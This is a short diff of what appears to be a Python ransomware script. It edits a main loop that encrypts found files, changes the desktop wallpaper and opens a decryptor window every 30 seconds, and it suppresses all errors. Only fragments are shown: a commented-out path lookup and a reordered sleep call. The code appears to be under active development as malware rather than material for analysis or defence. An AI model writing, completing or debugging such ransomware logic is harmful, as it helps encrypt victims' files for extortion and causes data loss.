@@ -151,7 +151,7 @@ def start_encryption(files):
 
 
 def menu():
-    encrypted_files = get_paths()
+    # encrypted_files = get_paths()
     new_files = get_files.find_files(test_path)
     aes_keys_and_base64_path = start_encryption(new_files)
 
@@ -183,9 +183,9 @@ if __name__ == "__main__":
     while True:
         try:
             menu()
-            time.sleep(30)
             change_wallpaper()
             open_decryptor()
+            time.sleep(30)
         except:
             pass
     pass
